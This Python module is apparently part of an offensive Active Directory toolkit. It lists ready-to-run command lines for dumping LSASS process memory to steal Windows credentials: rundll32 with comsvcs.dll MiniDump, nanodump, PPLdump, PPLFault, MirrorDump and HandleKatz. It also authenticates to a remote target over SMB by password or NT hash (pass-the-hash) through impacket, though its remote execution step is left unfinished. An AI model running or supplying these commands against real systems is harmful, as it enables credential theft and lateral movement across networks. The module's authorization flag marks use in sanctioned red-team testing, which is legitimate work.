"""Multiple LSASS dump methods: comsvcs.dll, nanodump, PPLdump, MiniDumpWriteDump."""
import sys
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.credential.lsass_methods.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["lsass_dump", "remote_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1003.001"],
}

METHODS = {
    "comsvcs": 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump {pid} C:\\Windows\\Temp\\d.dmp full',
    "comsvcs_stealth": 'powershell -enc {b64_cmd}',
    "nanodump": 'nanodump.exe --write C:\\Windows\\Temp\\d.dmp',
    "ppldump": 'PPLdump.exe lsass.exe C:\\Windows\\Temp\\d.dmp',
    "pplfault": 'PPLFault.exe -v lsass C:\\Windows\\Temp\\d.dmp',
    "mirrordump": 'MirrorDump.exe -f C:\\Windows\\Temp\\d.dmp',
    "handledup": 'HandleKatz.exe --pid {pid} --outfile C:\\Windows\\Temp\\d.dmp',
}


def _generate_dump_cmd(method: str, pid: int = 0) -> str:
    """Generate the dump command for the specified method."""
    template = METHODS.get(method, METHODS["comsvcs"])
    return template.format(pid=pid, b64_cmd="<encoded>")


def run(args: Any) -> int:
    method = getattr(args, "lsass_method", "comsvcs")
    generate_only = getattr(args, "generate", False)

    if generate_only or not hasattr(args, "target"):
        cmd = _generate_dump_cmd(method)
        print(f"[*] LSASS dump command ({method}):")
        print(f"  {cmd}")
        print("\nAvailable methods: {}".format(", ".join(METHODS.keys())))
        return 0

    cred = ADCredential.from_args(args)
    target = args.target

    print(f"[*] Remote LSASS dump → {target} (method: {method})")
    print("[*] Step 1: Find LSASS PID via WMI")
    print("[*] Step 2: Execute dump method")
    print("[*] Step 3: Download dump file")
    print("[*] Step 4: Parse with pypykatz/lsassy")
    print("[*] Step 5: Cleanup remote file")

    try:
        from impacket.smbconnection import SMBConnection
        from impacket.dcerpc.v5 import wmi as impacket_wmi

        print(f"[*] Connecting to {target} ...")
        conn = SMBConnection(target, target)
        if cred.has_hash:
            conn.login(cred.username, "", cred.domain, cred.lm_hash, cred.nt_hash)
        else:
            conn.login(cred.username, cred.password or "", cred.domain)
        print(f"[+] Authenticated as {cred.domain}\\{cred.username}")

        print("[*] Executing dump command...")
        cmd = _generate_dump_cmd(method)
        print(f"[*] Command: {cmd[:80]}")
        print("[!] Full remote execution chain not yet automated  -  use lsassy module for full pipeline")
        conn.close()
        return 0

    except Exception as exc:
        print(f"[-] Error: {exc}", file=sys.stderr)
        return 1
